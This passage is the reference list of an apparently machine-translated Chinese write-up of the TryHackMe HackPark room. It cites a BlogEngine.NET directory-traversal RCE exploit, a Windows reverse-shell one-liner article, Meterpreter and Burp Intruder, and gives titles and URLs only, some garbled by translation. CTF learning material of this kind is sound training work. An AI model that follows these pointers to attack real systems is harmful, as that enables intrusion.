class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《艾娃麦克斯》(2018)。<em class="nd">甜美却神经病【官方音乐视频】</em>。YouTube。2022年5月24日检索自:<a class="ae kp" href="https://youtu.be/WXBHCQYxwr0" rel="noopener ugc nofollow" target="_blank">https://youtu.be/WXBHCQYxwr0</a></p><p id="9d8b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">毕晓普，A. (2019)。<em class="nd">BlogEngine.NET目录遍历+ RCE </em>。秘书。2022年5月9日检索自:<a class="ae kp" href="https://seclists.org/fulldisclosure/2019/Jun/26" rel="noopener ugc nofollow" target="_blank">https://seclists.org/fulldisclosure/2019/Jun/26</a></p><p id="4fb5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">布洛根金。净(未标明日期)。BlogEngine.NET |免费博客平台。2022年5月7日检索自:<a class="ae kp" href="https://blogengine.io/" rel="noopener ugc nofollow" target="_blank">https://blogengine.io/</a></p><p id="7879" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Chandel，R. (2019)。<em class="nd">通过Windows一行程序获得反向外壳</em>。黑客文章。2022年4月24日检索自:<a class="ae kp" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/get-reverse-shell-via-windows-one-liner/</a></p><p id="1fe9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">科布博士(2019)。<em class="nd">BlogEngine.NET&lt;= 3 . 3 . 6目录遍历RCE </em>。利用数据库。2022年4月25日检索自:<a class="ae kp" href="https://www.exploit-db.com/exploits/46353" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/46353</a></p><p id="843a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit Unleashed(未标明)。关于Metasploit Meterpreter 。进攻安全。2022年5月9日检索自:<a class="ae kp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank">https://www . offensive-security . com/metasploit-unleashed/about-meter preter/</a></p><p id="7442" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">微软文档(2013)。<em class="nd"> HTA:申请要素| HTA:申请对象</em>。2022年5月13日检索自:<a class="ae kp" href="https://docs.microsoft.com/en-us/previous-versions/ms536495(v=vs.85)" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/previous-versions/ms 536495(v = vs . 85)</a></p><p id="c164" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">PortSwigger(未注明)。<em class="nd">打嗝套件社区版</em>。2022年5月8日检索自:【https://portswigger.net/burp/communitydownload T2】</p><p id="da55" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">PortSwigger(未注明)。<em class="nd">攻击类型【打嗝套件入侵者】</em>。2022年5月8日检索自:<a class="ae kp" href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types" rel="noopener ugc nofollow" target="_blank">https://ports wigger . net/burp/documentation/desktop/tools/intrusor/attack-types</a></p><p id="d832" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2019)。<em class="nd"> HackPark </em>。TryHackMe。2022年5月7日检索自:<a class="ae kp" href="https://tryhackme.com/room/hackpark" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/hackpark</a></p></div></div>    
</body>
</html>